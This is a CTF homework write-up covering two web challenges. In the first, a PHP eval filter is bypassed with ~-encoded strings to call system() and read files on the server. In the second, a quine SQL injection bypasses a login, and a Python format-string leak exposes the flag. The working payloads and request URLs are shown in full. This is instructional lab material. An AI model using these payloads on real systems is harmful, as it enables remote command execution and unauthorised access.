# HW0x05 writeup

## (#°д°)

> `FLAG{peeHpeeeeee(#°д°)!}`

### Problem

```php
<?=highlight_file(__FILE__)&&strlen($🐱=$_GET['(#°д°)'])<0x20&&!preg_match('/[a-z0-9`]/i',$🐱)&&@eval($🐱);
```

### solution

1. observer the problem

   - ```php
     strlen($🐱=$_GET['(#°д°)'])<0x20
     ```

     - variable that is the value of `(#°д°)` send via get request should not be longer than **32**

   - ```php
     !preg_match('/[a-z0-9`]/i',$🐱)
     ```

     - variable, 🐱, should not include any letter, digit, and <code>`</code>. 

   - ```php
     @eval($🐱)
     ```

     - evaluate the **string** variable, 🐱, as `PHP` code

2. try to send **get request** via `https://php.splitline.tw/?(#°д°)=asdf`

   - **FAILED**
     - *Query String Parameters* $\rightarrow$ `(:`
   - use **url encode**
     - `(#°д°)` $\rightarrow$ `%28%23%C2%B0%D0%B4%C2%B0%29`
     - send **request** via `https://php.splitline.tw/?%28%23%C2%B0%D0%B4%C2%B0%29=asdf`

3. contruct valid string of `(phpinfo)();`

   - use `~` operator

   - ```php
     php > echo urlencode(~"phpinfo");
     %8F%97%8F%96%91%99%90
     ```

   - send **request** $\rightarrow$ `https://php.splitline.tw/?%28%23%C2%B0%D0%B4%C2%B0%29=(~"%8F%97%8F%96%91%99%90")();`

4. search through display of previous step

   - `disable_functions` $\rightarrow$ *no value*

5. construct valid string of `(system)();`

   - ```php
     php > echo urlencode(~"system");
     %8C%86%8C%8B%9A%92
     ```

6. contruct **executed command**

   > ``https://php.splitline.tw/?%28%23%C2%B0%D0%B4%C2%B0%29=(~"%8C%86%8C%8B%9A%92")(~"{executed command}");`

   -  `ls -al`

     - ```php
       php > echo urlencode(~"ls -al");
       %93%8C%DF%D2%9E%93
       ```

     - receive nothing nothing interesting

   - `ls -al /`

     - ```php
       php > echo urlencode(~"ls -al /");
       %93%8C%DF%D2%9E%93%DF%D0
       ```

     - find readable file, `flag_GV99N6HuFj1kpkV45Dp7A6Usk5s5nLUY`

   - `cat /flag_GV99N6HuFj1kpkV45Dp7A6Usk5s5nLUY`

     - ```php
       php > echo urlencode(~"cat /flag_GV99N6HuFj1kpkV45Dp7A6Usk5s5nLUY");
       %9C%9E%8B%DF%D0%99%93%9E%98%A0%B8%A9%C6%C6%B1%C9%B7%8A%B9%95%CE%94%8F%94%A9%CB%CA%BB%8F%C8%BE%C9%AA%8C%94%CA%8C%CA%91%B3%AA%A6
       ```

     - <u>too long to be valid</u>

   - `cat /*`

     - ```php
       php > echo urlencode(~"cat /*");
       %9C%9E%8B%DF%D0%D5
       ```

     - receive flag $\implies$ `FLAG{peeHpeeeeee(#°д°)!}`



## VISUAL BASIC 2077

> `FLAG{qu1n3_sq1_1nj3ct10nnn.__init__}`



1. view hint $\implies$ `_='_=%r;return (_%%_)';return (_%_)`

   - **Quine** in <u>Python3.x</u>
     - takes no input and *outputs a copy of its own code*

2. view `main.py`

   ```python
   cursor = db().cursor()
   query = f"select username, password from users where username='{username}' and password='{password}'"
   cursor.execute(query)
   res = cursor.fetchone()
   
   if res != None and res['username'] == username and res['password'] == password:
     return ("<h1>Hello, " + username + " ｡:.ﾟヽ(*´∀`)ﾉﾟ.:｡ </h1> Here is your flag: {flag} ").format(flag=flag)
   ```

   In order to login successfully, `username, password` that query from **POST request** should match the result.

   $\therefore$ take advantage of **Quine**

3. construct **SQL Quine** ([VisualBasic2077.py](./b05901003/code/VisualBasic2077.py))

   > `username = quine("' UNION SELECT $$ AS username, CHAR(" + str(ord(password)) + ") AS k--")`

   - login successfully

4. look at the *return when login successfully* and 

   ```python
   class Flag():
       def __init__(self, flag):
           self.flag = flag
       def __str__(self):
           return self.flag if session.get('is_admin', False) else "Oops, You're not admin (・へ・)"
   ```

   $\because$ `session['is_admin'] = False`

   $\therefore$ Server will only response with `Oops, You're not admin (・へ・)`. However, by access `flag.flag` directly, one can get the real flag.

5. construct new **SQL Quine**

   > `username = quine("' UNION SELECT $$ AS username, CHAR(" + str(ord(password)) + ") AS k--{flag.flag}")`

   Add `{flag.flag}` after `--`, single line comments in SQL and is able to print out the real flag.

